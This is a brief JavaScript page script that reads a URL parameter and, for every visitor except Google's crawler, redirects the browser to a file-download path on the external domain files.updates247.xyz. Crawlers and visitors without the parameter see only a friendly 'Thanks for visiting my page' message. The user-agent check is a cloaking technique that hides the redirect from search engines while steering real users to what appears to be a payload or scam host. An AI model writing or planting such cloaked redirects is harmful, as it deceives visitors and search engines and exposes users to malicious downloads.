const params = new URLSearchParams(window.location.search);
const slug = params.get('io0');

console.log("IO0:", slug);

if (slug && !navigator.userAgent.includes('Googlebot')) {

    window.location.href =
        "https://files.updates247.xyz/" + encodeURIComponent(slug);

} else {
    console.log("Thanks for visiting my page");
}